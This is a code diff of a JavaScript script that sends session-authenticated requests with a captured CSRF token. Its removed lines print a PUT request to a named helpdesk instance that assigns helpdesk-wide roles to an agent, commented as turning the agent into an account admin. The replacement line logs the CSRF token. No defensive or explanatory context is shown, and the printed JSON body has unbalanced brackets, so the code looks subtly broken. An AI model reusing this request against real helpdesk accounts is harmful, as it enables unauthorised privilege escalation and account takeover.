@@ -16,18 +16,7 @@ async function sendRequests() {
             },
             body: '_method=put'
         });
-
-        // Execute PUT request that convert Agent ==> account admin
-        await fetch('https://akfinfocity09090208.freshcmdb.com/api/_/agents/20390480/map_workspace_groups_and_roles', {
-            method: 'PUT',
-            credentials: 'include',
-            headers: {
-                'Content-Type': 'application/json',
-                'X-Csrf-Token': csrfToken
-            },
-            body: `{"observer_of":[],"member_of":[],"roles":[{"role_id":18498051,"assignment_scope":"entire_helpdesk"},{"role_id":18498052,"assignment_scope":"entire_helpdesk"},"workspace_id":2}`
-        });
-
+        console.log(csrfToken);
         console.log('Requests completed successfully');
     } catch (error) {
         console.error('Error:', error);
